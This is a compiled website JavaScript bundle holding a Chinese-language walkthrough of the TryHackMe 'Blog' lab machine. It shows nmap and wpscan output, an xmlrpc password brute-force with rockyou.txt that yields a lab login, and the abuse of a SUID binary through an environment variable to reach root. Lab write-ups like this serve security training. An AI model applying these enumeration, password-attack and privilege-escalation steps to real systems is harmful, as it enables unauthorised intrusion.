"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[546],{8184:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>r,default:()=>u,frontMatter:()=>o,metadata:()=>i,toc:()=>c});var s=t(74848),a=t(28453);const o={sidebar_position:87,tags:["Easy","Linux","\u547d\u4ee4\u6ce8\u5165","SUID"],title:"Blog",description:"Blog",sidebar_label:"Blog",slug:"/tryhackme/87"},r="Blog",i={id:"box/TryHackMe/87",title:"Blog",description:"Blog",source:"@site/docs/box/TryHackMe/87.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/87",permalink:"/docs/tryhackme/87",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"\u547d\u4ee4\u6ce8\u5165",permalink:"/docs/tags/\u547d\u4ee4\u6ce8\u5165"},{label:"SUID",permalink:"/docs/tags/suid"}],version:"current",sidebarPosition:87,frontMatter:{sidebar_position:87,tags:["Easy","Linux","\u547d\u4ee4\u6ce8\u5165","SUID"],title:"Blog",description:"Blog",sidebar_label:"Blog",slug:"/tryhackme/87"},sidebar:"boxSidebar",previous:{title:"UltraTech",permalink:"/docs/tryhackme/86"},next:{title:"Biohazard",permalink:"/docs/tryhackme/88"}},l={},c=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3},{value:"www-data \u2014&gt; root",id:"www-data--root",level:3}];function d(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"blog",children:"Blog"}),"\n",(0,s.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-116-83:~/blog# nmap -sTCV -p 22,80,139,445 --min-rate 1000 10.10.23.40\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-12 13:18 BST\nNmap scan report for ip-10-10-23-40.eu-west-1.compute.internal (10.10.23.40)\nHost is up (0.00022s latency).\n\nPORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)\n|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)\n|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (EdDSA)\n80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))\n|_http-generator: WordPress 5.0\n| http-robots.txt: 1 disallowed entry \n|_/wp-admin/\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)\nMAC Address: 02:C0:75:7B:D6:29 (Unknown)\nService Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n| smb-os-discovery: \n|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)\n|   Computer name: blog\n|   NetBIOS computer name: BLOG\\x00\n|   Domain name: \\x00\n|   FQDN: blog\n|_  System time: 2023-09-12T12:18:50+00:00\n| smb-security-mode: \n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled but not required\n| smb2-time: \n|   date: 2023-09-12 13:18:50\n|_  start_date: 1600-12-31 23:58:45\n"})}),"\n",(0,s.jsx)(n.h2,{id:"80",children:"80"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-116-83:~/blog# wpscan --url http://10.10.23.40/ -e u\n[+] bjoel\n | Found By: Wp Json Api (Aggressive Detection)\n |  - http://10.10.23.40/wp-json/wp/v2/users/?per_page=100&page=1\n | Confirmed By:\n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n |  Login Error Messages (Aggressive Detection)\n\n[+] kwheel\n | Found By: Wp Json Api (Aggressive Detection)\n |  - http://10.10.23.40/wp-json/wp/v2/users/?per_page=100&page=1\n | Confirmed By:\n |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)\n |  Login Error Messages (Aggressive Detection)\n\n[+] Karen Wheeler\n | Found By: Rss Generator (Aggressive Detection)\n\n[+] Billy Joel\n | Found By: Rss Generator (Aggressive Detection)\n......\nroot@ip-10-10-116-83:~/blog# wpscan --password-attack xmlrpc -t 10 -U kwheel,bjoel -P `locate rockyou.txt` --url http://blog.thm/\n.....\n[+] Performing password attack on Xmlrpc against 2 user/s\n[SUCCESS] - kwheel / cutiepie1\n.....\n"})}),"\n",(0,s.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,s.jsx)(n.h3,{id:"www-data",children:"www-data"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703214226.png",alt:"20240703214226"})}),"\n",(0,s.jsx)(n.h3,{id:"www-data--root",children:"www-data \u2014> root"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703214237.png",alt:"20240703214237"})}),"\n",(0,s.jsx)(n.p,{children:"\u679a\u4e3e SUID \u53d1\u73b0\u4e00\u4e2a\u6ca1\u6709\u89c1\u8fc7\u7684\u7a0b\u5e8f, \u6267\u884c\u7684\u65f6\u5019\u53d1\u73b0\u5176\u4e00\u76f4\u8f93\u51fa"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@blog:/home/bjoel$ /usr/sbin/checker\nNot an Admin\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5c06\u7a0b\u5e8f\u4e0b\u8f7d\u5230\u672c\u5730\u8fdb\u884c\u67e5\u770b\u5e76\u8fdb\u884c\u5206\u6790\n",(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703214302.png",alt:"20240703214302"})]}),"\n",(0,s.jsx)(n.p,{children:"\u6839\u636e\u524d\u6587\u5206\u6790, \u611f\u89c9\u662f\u8bfb\u53d6\u4e00\u4e2a\u73af\u5883\u53d8\u91cf\u8fdb\u884c\u5224\u65ad, \u6240\u4ee5\u6211\u5f00\u59cb\u4e86\u6d4b\u8bd5\u6700\u540e\u53d1\u73b0\u662f admin"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240703214331.png",alt:"20240703214331"})})]})}function u(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(d,{...e})}):d(e)}},28453:(e,n,t)=>{t.d(n,{R:()=>r,x:()=>i});var s=t(96540);const a={},o=s.createContext(a);function r(e){const n=s.useContext(o);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function i(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:r(e.components),s.createElement(o.Provider,{value:n},e.children)}}}]);